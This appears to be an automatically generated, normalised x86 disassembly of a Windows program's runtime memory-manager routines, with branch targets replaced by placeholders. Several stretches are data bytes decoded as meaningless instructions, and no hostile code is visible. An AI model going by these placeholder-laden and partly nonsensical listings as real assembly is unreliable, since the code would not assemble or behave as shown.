sub_401092
call [ eax + r-xdata ]
or al [ esi ]
push ebx
je r-xdata
arpl [ esp + edi * 8 + 0x10 ] si
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
push esi
popad
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add ah dh
pop eax
inc eax
add [ eax ] al
pop ecx
inc eax
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] dl
pop ecx
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0x11004032 ] al
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
nop
inc eax
adc [ eax ] al
add [ edi ] eax
dec ecx
outsb
je r-xdata
inc eax
add ah bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sar bh 0x25
jb r-xdata
inc esi
jne r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
mov al [ 0xffffffff8b004781 ]
sar bh 0x25
pushfd
add [ edi ] 0x25ffc08b
cwde
add [ edi ] 0x25ffc08b
xchg esp eax
add [ edi ] 0x25ffc08b
nop
add [ edi ] 0x25ffc08b
mov [ ecx - 0x3f74ffb9 ] es
jmp [ __import_lookup_table_0(kernel32:GetThreadLocale) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ eax ] al
add [ edx + eax * 2 ] eax
jns r-xdata
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
adc [ eax ] al
add al 0x0
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ eax + eax * 2 ] 0x0
int3
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
inc eax
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403344
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add ah dh
pop eax
inc eax
add [ eax ] al
pop ecx
inc eax
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] dl
pop ecx
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0x11004032 ] al
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
sar bh 0x25
jb r-xdata
mov al [ 0xffffffff8b004781 ]
sar bh 0x25
pushfd
add [ edi ] 0x25ffc08b
cwde
add [ edi ] 0x25ffc08b
xchg esp eax
add [ edi ] 0x25ffc08b
nop
add [ edi ] 0x25ffc08b
mov [ ecx - 0x3f74ffb9 ] es
jmp [ __import_lookup_table_0(kernel32:GetThreadLocale) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401380
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401340
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013d8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401380
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401420
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013d8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401490
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013d8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401524
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401358
xor eax eax
mov [ ebx ] eax
sub_401588
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401350
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401358
xor eax eax
mov [ ebx ] eax
sub_401600
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401358
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401408
mov [ rw-data ] 0x1
sub_4016b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401350
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40174c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401358
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401524
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016b8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401420
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401600
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401408
jmp r-xdata
sub_40185c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016b8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
sub_401980
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40174c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401600
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401490
jmp r-xdata
sub_401a0c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ac2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401360
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
push 0xff8
push 0x0
call sub_401340
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ac9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401370
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ad0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401ba6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401368
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401358
mov ebx [ ebx ]
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401378
retn
push rw-data
call sub_401370
sub_401bb0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c14
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c44
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e18
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c98
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c74
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cc0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bb0
add ebx esi
mov [ rw-data ] 0x6
sub_401d30
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bb0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c14
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401980
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401980
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c44
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401490
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c98
sub_401e18
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d68
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ea0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c74
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401eec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ea0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cc0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d30
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c44
sub [ edi + 0x4 ] 0x4
sub_401f78
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017cc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fa4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40185c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fd8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402004
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bb0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e18
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f78
test al al
jne r-xdata
mov eax esi
call sub_401fd8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a0c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402274
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401368
mov eax [ ebp - 0x4 ]
